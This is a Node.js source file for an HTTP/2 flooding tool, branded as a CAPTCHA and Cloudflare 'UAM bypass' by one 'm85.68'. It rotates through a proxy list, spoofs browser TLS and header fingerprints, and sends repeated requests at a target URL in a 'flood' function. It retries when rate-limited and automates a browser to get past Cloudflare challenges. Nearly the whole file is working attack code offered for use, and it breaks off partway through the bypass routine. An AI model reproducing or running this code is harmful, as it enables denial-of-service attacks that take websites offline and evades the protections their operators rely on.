const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const net = require("net");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

// Helper function to replace page.waitForTimeout
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ANSI color codes for aesthetic terminal output
const COLORS = {
  reset: "\x1b[0m",
  cyan: "\x1b[36m",
  green: "\x1b[32m",
  red: "\x1b[31m",
  yellow: "\x1b[33m",
  magenta: "\x1b[35m",
  blue: "\x1b[34m",
  white: "\x1b[37m",
  bold: "\x1b[1m"
};

// ASCII art header with your name
const printHeader = () => {
  console.clear();
  console.log(`${COLORS.magenta}${COLORS.bold}+************************************************************+${COLORS.reset}`);
  console.log(`${COLORS.cyan}${COLORS.bold}||                 #  m85.68's Advanced  #                  ||${COLORS.reset}`);
  console.log(`${COLORS.cyan}${COLORS.bold}||               #  CAPTCHA AND UAM BYPASS  #               ||${COLORS.reset}`);
  console.log(`${COLORS.magenta}${COLORS.bold}+************************************************************+${COLORS.reset}`);
};

// Read proxies from file
function loadProxies(proxyFile) {
  try {
    if (!fs.existsSync(proxyFile)) {
      console.log(`${COLORS.red}ðŸš« Error: Proxy file ${proxyFile} does not exist${COLORS.reset}`);
      process.exit(1);
    }
    const proxyData = fs.readFileSync(proxyFile, 'utf8').trim();
    const proxyList = proxyData.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    if (proxyList.length === 0) {
      console.log(`${COLORS.red}ðŸš« Error: Proxy file ${proxyFile} is empty${COLORS.reset}`);
      process.exit(1);
    }
    console.log(`${COLORS.green}âœ… m85.68: Loaded ${proxyList.length} proxies from ${proxyFile}${COLORS.reset}`);
    return proxyList;
  } catch (err) {
    console.log(`${COLORS.red}ðŸš« Error reading proxy file ${proxyFile}: ${err.message}${COLORS.reset}`);
    process.exit(1);
  }
}

// TLS Configuration
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = [
  defaultCiphers[2],
  defaultCiphers[1],
  defaultCiphers[0],
  ...defaultCiphers.slice(3)
].join(":");
const sigalgs = [
  "ecdsa_secp256r1_sha256",
  "rsa_pss_rsae_sha256",
  "rsa_pkcs1_sha256",
  "ecdsa_secp384r1_sha384",
  "rsa_pss_rsae_sha384",
  "rsa_pkcs1_sha384",
  "rsa_pss_rsae_sha512",
  "rsa_pkcs1_sha512"
];
const ecdhCurve = "X25519:P-256:P-384:P-521";
const secureOptions = 
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_COOKIE_EXCHANGE |
  crypto.constants.SSL_OP_PKCS1_CHECK_1 |
  crypto.constants.SSL_OP_PKCS1_CHECK_2 |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
  ciphers: ciphers,
  sigalgs: sigalgs.join(':'),
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol
});

// Headers arrays
const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];
const cache_header = [
  'no-cache',
  'max-age=0',
  'no-cache, no-store, must-revalidate',
  'no-store',
  'no-cache, no-store, private, max-age=0'
];
const language_header = [
  'en-US,en;q=0.9',
  'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-GB,en;q=0.9'
];

// Parse arguments
if (process.argv.length < 5) {
  printHeader();
  console.log(`${COLORS.red}${COLORS.bold}============================================================${COLORS.reset}`);
  console.log(`${COLORS.red}${COLORS.bold}  Usage:${COLORS.reset}`);
  console.log(`${COLORS.white}    node captcha2.js <target> <rate> <threads> <proxyFile>${COLORS.reset}`);
  console.log(`${COLORS.red}${COLORS.bold}------------------------------------------------------------${COLORS.reset}`);
  console.log(`${COLORS.yellow}${COLORS.bold}  Example:${COLORS.reset}`);
  console.log(`${COLORS.white}    node captcha2.js https://example.com 5 4 proxy.txt${COLORS.reset}`);
  console.log(`${COLORS.red}${COLORS.bold}============================================================${COLORS.reset}\n`);
  process.exit(1);
}
const args = {
  target: process.argv[2],
  Rate: parseInt(process.argv[3]),
  threads: parseInt(process.argv[4]),
  proxyFile: process.argv[5]
};

// Load proxies from file
const proxies = loadProxies(args.proxyFile);
const parsedTarget = url.parse(args.target);

// Track failed proxies
global.failedProxies = new Set();

// Proxy index for sequential selection
global.proxyIndex = 0;

// Flood function with proxy
function flood(userAgent, cookie, proxy) {
  try {
    console.log(`${COLORS.cyan} m85.68: Flooding with proxy ${proxy}...${COLORS.reset}`);
    let parsed = url.parse(args.target);
    let path = parsed.path;
    const proxyParts = proxy.split(':');
    const [proxyHost, proxyPort, proxyUser, proxyPass] = proxyParts.length === 4 ? proxyParts : [proxyParts[0], proxyParts[1], null, null];
    function randomDelay(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    let interval = 1000; // Changed to 1000ms to reduce rate
    function getChromeVersion(userAgent) {
      const chromeVersionRegex = /Chrome\/([\d.]+)/;
      const match = userAgent.match(chromeVersionRegex);
      return match ? match[1] : "126";
    }
    const chromever = getChromeVersion(userAgent);
    const randValue = function(list) { return list[Math.floor(Math.random() * list.length)]; };
    const lang_header1 = [
      "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
      "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9",
      "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9",
      "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9",
      "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9",
      "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9"
    ];
    let fixed = {
      ":method": "GET",
      ":authority": parsed.host,
      ":scheme": "https",
      ":path": path,
      "user-agent": userAgent,
      "upgrade-insecure-requests": "1",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "navigate",
      "sec-fetch-user": "?1",
      "sec-fetch-dest": "document",
      "cookie": cookie,
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "Chrome";v="${chromever}"`,
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "Windows",
      "accept-encoding": "gzip, deflate, br, zstd",
      "accept-language": randValue(lang_header1) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
      "purpure-secretf-id": "formula-" + generateRandomString(1, 2),
      "priority": "u=0, i",
      "te": "trailers"
    };
    let randomHeaders = {
      "purpure-secretf-id": Math.random() < 0.3 ? "formula-" + generateRandomString(1, 2) : undefined,
      "sec-stake-fommunity": Math.random() < 0.5 ? "bet-clc" : undefined,
      "SElF-DYNAMIC": Math.random() < 0.6 ? generateRandomString(1, 2) + "-SElF-DYNAMIC-" + generateRandomString(1, 2) + ":zero-" + generateRandomString(1, 2) : undefined,
      "stringclick-bad": Math.random() < 0.6 ? "stringclick-bad-" + generateRandomString(1, 2) + ":router-" + generateRandomString(1, 2) : undefined,
      "root-user": Math.random() < 0.6 ? "root-user" + generateRandomString(1, 2) + ":root-" + generateRandomString(1, 2) : undefined,
      "Java-x-seft": Math.random() < 0.6 ? "Java-x-seft" + generateRandomString(1, 2) + ":zero-" + generateRandomString(1, 2) : undefined,
      "HTTP-requests": Math.random() < 0.6 ? "HTTP-requests-with-unusual-HTTP-headers-or-URI-path-" + generateRandomString(1, 2) + ":router-" + generateRandomString(1, 2) : undefined,
      "C-Boost": Math.random() < 0.3 ? generateRandomString(1, 2) + "-C-Boost-" + generateRandomString(1, 2) + ":zero-" + generateRandomString(1, 2) : undefined,
      "sys-nodejs": Math.random() < 0.3 ? "sys-nodejs-" + generateRandomString(1, 2) + ":router-" + generateRandomString(1, 2) : undefined
    };
    let headerPositions = [
      "accept-language",
      "sec-fetch-user",
      "sec-ch-ua-platform",
      "accept",
      "sec-ch-ua",
      "sec-ch-ua-mobile",
      "accept-encoding",
      "purpure-secretf-id",
      "priority"
    ];
    let headersArray = Object.entries(fixed);
    let shuffledRandomHeaders = Object.entries(randomHeaders).filter(([_, value]) => value !== undefined).sort(() => Math.random() - 0.5);
    shuffledRandomHeaders.forEach(([key, value]) => {
      let insertAfter = headerPositions[Math.floor(Math.random() * headerPositions.length)];
      let index = headersArray.findIndex(([k, _]) => k === insertAfter);
      if (index !== -1) {
        headersArray.splice(index + 1, 0, [key, value]);
      }
    });
    let dynHeaders = {};
    headersArray.forEach(([key, value]) => {
      dynHeaders[key] = value;
    });
    const secureOptionsList = [
      crypto.constants.SSL_OP_NO_RENEGOTIATION,
      crypto.constants.SSL_OP_NO_TICKET,
      crypto.constants.SSL_OP_NO_SSLv2,
      crypto.constants.SSL_OP_NO_SSLv3,
      crypto.constants.SSL_OP_NO_COMPRESSION,
      crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
      crypto.constants.SSL_OP_TLSEXT_PADDING,
      crypto.constants.SSL_OP_ALL
    ];
    function createTunneledConnection(parsed, proxy) {
      return new Promise((resolve, reject) => {
        const proxyParts = proxy.split(':');
        const proxyHost = proxyParts[0];
        const proxyPort = parseInt(proxyParts[1]);
        const proxyUser = proxyParts.length === 4 ? proxyParts[2] : null;
        const proxyPass = proxyParts.length === 4 ? proxyParts[3] : null;
        const socket = net.connect({
          host: proxyHost,
          port: proxyPort
        });
        socket.on('connect', () => {
          let connectRequest = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\n`;
          if (proxyUser && proxyPass) {
            const auth = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
            connectRequest += `Proxy-Authorization: Basic ${auth}\r\n`;
          }
          connectRequest += '\r\n';
          socket.write(connectRequest);
          let responseData = '';
          socket.on('data', (data) => {
            responseData += data.toString();
            if (responseData.indexOf('\r\n\r\n') !== -1) {
              if (responseData.match(/^HTTP\/1\.[0-1] 200/)) {
                const tlsSocket = tls.connect({
                  socket: socket,
                  servername: parsed.host,
                  minVersion: "TLSv1.2",
                  maxVersion: "TLSv1.3",
                  ALPNProtocols: ["h2"],
                  rejectUnauthorized: false,
                  sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
                  ecdhCurve: ecdhCurve,
                  secureOptions: Math.random() < 0.5 ? secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)] : undefined
                }, () => {
                  resolve(tlsSocket);
                });
                tlsSocket.on('error', (err) => {
                  socket.destroy();
                  reject(new Error(`TLS error: ${err.message}`));
                });
              } else {
                socket.destroy();
                reject(new Error(`Proxy rejected CONNECT request: ${responseData.split('\r\n')[0]}`));
              }
            }
          });
          socket.on('error', (err) => {
            reject(new Error(`Socket error: ${err.message}`));
          });
        });
        socket.on('error', (err) => {
          reject(new Error(`Socket connection error: ${err.message}`));
        });
      });
    }
    console.log(`${COLORS.blue} m85.68: Creating TLS socket for proxy ${proxy}...${COLORS.reset}`);
    createTunneledConnection(parsed, proxy).then((tlsSocket) => {
      const client = http2.connect(parsed.href, {
        createConnection: () => tlsSocket,
        settings: {
          headerTableSize: 65536,
          enablePush: false,
          initialWindowSize: 6291456,
          "NO_RFC7540_PRIORITIES": Math.random() < 0.5 ? true : "1"
        }
      }, (session) => {
        session.setLocalWindowSize(12517377 + 65535);
      });
      client.on("connect", () => {
        console.log(`${COLORS.green} m85.68: HTTP/2 connected with proxy ${proxy}${COLORS.reset}`);
        let clearr = setInterval(() => {
          for (let i = 0; i < args.Rate; i++) {
            try {
              const request = client.request(dynHeaders, {
                weight: Math.random() < 0.5 ? 42 : 256,
                depends_on: 0,
                exclusive: false
              });
              request.on('response', (headers) => {
                const status = headers[':status'];
                if (status === 429) {
                  console.log(`${COLORS.yellow} m85.68: Received 429 from target with proxy ${proxy}, retrying after 10s${COLORS.reset}`);
                  clearInterval(clearr);
                  client.destroy();
                  tlsSocket.destroy();
                  setTimeout(() => flood(userAgent, cookie, proxy), 10000);
                } else if (status === 403) {
                  console.log(`${COLORS.yellow} m85.68: Received 403 from target with proxy ${proxy}, marking as failed${COLORS.reset}`);
                  global.failedProxies.add(proxy);
                  clearInterval(clearr);
                  client.destroy();
                  tlsSocket.destroy();
                }
              });
              request.on('error', (err) => {
                if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
                  console.log(`${COLORS.red} m85.68: Request stream error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
                }
              });
              request.end();
            } catch (reqErr) {
              if (reqErr.code !== 'NGHTTP2_REFUSED_STREAM') {
                console.log(`${COLORS.red} m85.68: Request error with proxy ${proxy}: ${reqErr.message}${COLORS.reset}`);
              }
            }
          }
        }, interval);
        let goawayCount = 0;
        client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
          clearInterval(clearr);
          let backoff = Math.min(1000 * Math.pow(2, goawayCount), 15000);
          console.log(`${COLORS.yellow} m85.68: GOAWAY received for proxy ${proxy}, retrying after ${backoff}ms${COLORS.reset}`);
          setTimeout(() => {
            goawayCount++;
            client.destroy();
            tlsSocket.destroy();
            if (!global.failedProxies.has(proxy)) {
              flood(userAgent, cookie, proxy);
            }
          }, backoff);
        });
        client.on("close", () => {
          clearInterval(clearr);
          client.destroy();
          tlsSocket.destroy();
          console.log(`${COLORS.blue} m85.68: Connection closed for proxy ${proxy}${COLORS.reset}`);
          if (!global.failedProxies.has(proxy)) {
            flood(userAgent, cookie, proxy);
          }
        });
        client.on("error", (err) => {
          clearInterval(clearr);
          if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
            console.log(`${COLORS.red} m85.68: Client error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
          }
          client.destroy();
          tlsSocket.destroy();
          if (err.code !== 'NGHTTP2_REFUSED_STREAM' && !global.failedProxies.has(proxy)) {
            global.failedProxies.add(proxy);
          } else if (!global.failedProxies.has(proxy)) {
            flood(userAgent, cookie, proxy);
          }
        });
      });
      client.on("error", (err) => {
        if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
          console.log(`${COLORS.red} m85.68: Client connection error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
        }
        client.destroy();
        tlsSocket.destroy();
        if (err.code !== 'NGHTTP2_REFUSED_STREAM') {
          global.failedProxies.add(proxy);
        }
      });
    }).catch((err) => {
      console.log(`${COLORS.red} m85.68: Connection error with proxy ${proxy}: ${err.message}${COLORS.reset}`);
      if (err.message.includes('429')) {
        console.log(`${COLORS.yellow} m85.68: 429 Too Many Requests, retrying proxy ${proxy} after 10s${COLORS.reset}`);
        setTimeout(() => flood(userAgent, cookie, proxy), 10000);
      } else {
        global.failedProxies.add(proxy);
      }
    });
  } catch (err) {
    console.log(`${COLORS.red} m85.68: Error in flood function with proxy ${proxy}: ${err.message}${COLORS.reset}`);
    global.failedProxies.add(proxy);
  }
}

// Helper functions
function getNextProxy(arr) {
  let start = global.proxyIndex || 0;
  for (let i = start; i < start + arr.length; i++) {
    let idx = i % arr.length;
    let item = arr[idx];
    if (!global.failedProxies.has(item.proxy ? item.proxy : item)) {
      global.proxyIndex = (idx + 1) % arr.length;
      let proxyStr = item.proxy ? item.proxy : item;
      console.log(`${COLORS.blue} m85.68: Selected proxy ${proxyStr} (${global.proxyIndex}/${proxies.length})${COLORS.reset}`);
      return item;
    }
  }
  console.log(`${COLORS.red} m85.68: No available proxies left!${COLORS.reset}`);
  return null;
}
function randstr(length) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}
function generateRandomString(minLength, maxLength) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters[Math.floor(Math.random() * characters.length)];
  }
  return result;
}
function shuffleObject(obj) {
  const keys = Object.keys(obj);
  const shuffledKeys = [];
  for (let i = keys.length - 1; i >= 0; i--) {
    const randomIndex = Math.floor(Math.random() * (i + 1));
    shuffledKeys[i] = shuffledKeys[randomIndex];
    shuffledKeys[randomIndex] = keys[i];
  }
  const result = {};
  shuffledKeys.forEach((key) => {
    if (key) result[key] = obj[key];
  });
  return result;
}

// Cloudflare Bypass with proxy
function bypassCloudflareOnce(attemptNum) {
  if (typeof attemptNum === 'undefined') attemptNum = 1;
  let response = null;
  let browser = null;
  let page = null;
  const maxRetries = 3;
  let retryCount = 0;
  let proxy = null;
  function tryBypass(resolve, reject) {
    proxy = getNextProxy(proxies);
    if (!proxy) {
      console.log(`${COLORS.red} m85.68: No valid proxies available for bypass attempt #${attemptNum}!${COLORS.reset}`);
      resolve({
        cookies: [],
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        cfCle